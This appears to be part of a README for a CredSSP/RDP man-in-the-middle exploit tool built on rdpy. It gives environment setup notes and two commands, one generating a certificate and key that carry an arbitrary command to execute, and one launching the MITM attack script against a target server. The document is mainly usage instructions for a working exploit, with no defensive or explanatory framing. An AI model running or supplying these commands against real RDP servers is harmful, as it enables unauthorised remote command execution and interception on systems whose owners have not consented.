* It assumes a pretty clean inital state. Best to uninstall first relevant compontants such as cryptography,pyopenssl maybe (pip uninstall cryptography).
* A different version of openssl needed to be installed for this to run successfully.  The install script does that.
* Please follow the instructions in the described order.

# Running the exploit


Export a certificate suitable for Server Authentication from any domain.


To generate a suitable certificate for the command to execute :

```
$ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD
```

(exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)

To run the attack script:

```
$ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
```

More details are in the usage section of the scripts(--help).
